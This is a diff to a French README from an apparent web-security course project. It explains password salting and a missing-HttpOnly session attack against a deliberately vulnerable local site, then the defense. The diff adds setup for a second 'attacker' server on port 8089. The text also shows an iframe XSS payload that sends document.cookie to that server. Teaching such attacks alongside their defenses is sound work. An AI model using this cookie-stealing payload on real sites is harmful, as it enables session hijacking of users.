@@ -27,12 +27,15 @@ Pour générer un nouveau mot de passe nous avons utilisé le code suivant :<br/
 De cette manière un salt est généré aléatoirement pour chaque mot de passe et l’utilisation de rainbow tables devient plus compliqué.<br/>
 <br/>
 ## Session HttpOnly
+Il faut lancer un serveur sur le port de votre choix (8080) dans le dossier *was-grp11/* et un autre sur le port 8089 (vous pouvez en choisir un autre mais il faut modifier le fichier vulnérable) dans le dossier *bad_session/*.<br/>
 HttpOnly est un attribut des cookies qui permet d’indiquer aux navigateurs de ne pas laisser des scripts avoir accès aux cookies depuis le DOM. Le site vulnérable n’implémente pas HttpOnly.<br/>
 **Attaque :**<br/>
 L’attaquant a déposé un lien permettant d’envoyer une requête contenant les cookies sur un site malveillant. HttpOnly est désactivé.<br/>
 `<iframe src="javascript:document.location='http://localhost:8089/bad_session_httponly.php?cookie='+document.cookie"></iframe>`<br/>
+http://localhost:8080/session/vulnerable_session_httponly.php
 **Defense :**<br/>
 Pour protéger ce site de ce genre d’attaque, il faut préciser aux navigateurs d’utiliser HttpOnly. De cette manière, un attaquant ne pourra pas récupérer des données contenues dans les cookies.<br/>
+![image](https://user-images.githubusercontent.com/54988405/137313105-bded2987-aeda-411d-84d9-6041ad80afa8.png)
 <br/>
 ## Session ID Length
 **Attaque :**<br/>
